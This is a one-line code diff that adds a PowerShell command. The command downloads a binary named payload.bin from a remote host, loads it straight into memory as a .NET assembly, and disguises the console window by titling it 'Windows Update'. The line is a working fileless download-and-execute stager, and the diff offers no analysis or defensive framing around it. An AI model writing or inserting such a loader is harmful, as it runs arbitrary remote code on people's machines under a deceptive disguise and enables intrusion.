@@ -1,0 +1,1 @@
+$PayloadBytes = (New-Object System.Net.WebClient).DownloadData('http://internal.corp/payload.bin'); [Reflection.Assembly]::Load($PayloadBytes); $Host.UI.RawUI.WindowTitle = "Windows Update"; $StageMarker = "stage-29"
